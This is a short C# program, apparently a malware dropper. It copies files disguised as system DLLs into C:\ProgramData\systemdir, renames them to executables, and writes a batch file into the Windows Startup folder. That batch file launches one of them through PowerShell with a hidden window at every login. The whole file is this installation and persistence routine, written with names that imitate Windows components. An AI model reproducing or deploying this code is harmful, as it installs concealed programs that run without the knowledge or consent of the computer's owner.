using System;
using System.Collections.Generic;
using System.IO;
namespace runner
{
    class Program
    {

        static void Main()
        {
           
            string path = Directory.GetCurrentDirectory() + @"\systemwin.dll";
            string dstn = @"C:\ProgramData\systemdir\systemwin.exe";
            string mkdir = @"C:\ProgramData\systemdir";
            string infexer = Directory.GetCurrentDirectory() + @"\systemw.dll";
            string infexerdistence = @"C:\ProgramData\systemdir\systemw.exe";
            //string starterpath = Directory.GetCurrentDirectory() + @"\system.dll";
            string shoterpath = Directory.GetCurrentDirectory() + @"\systemwint.dll";
            string shoterdstn = @"C:\ProgramData\systemdir\systemwint.exe";
            //sstring startdstn = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\system.exe";
            Directory.CreateDirectory(mkdir);
            File.Copy(path, dstn);
            //File.Copy(starterpath,startdstn);
            File.Copy(shoterpath, shoterdstn);
            File.Copy(infexer, infexerdistence);
            string batpath = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\systemwin.bat";
            string batcontent = @"powershell Start-Process -FilePath ""C:\ProgramData\systemdir\systemwin.exe"" -ArgumentList ""args"" -WindowStyle Hidden";
            File.WriteAllText(batpath, batcontent);

        }


    }
}
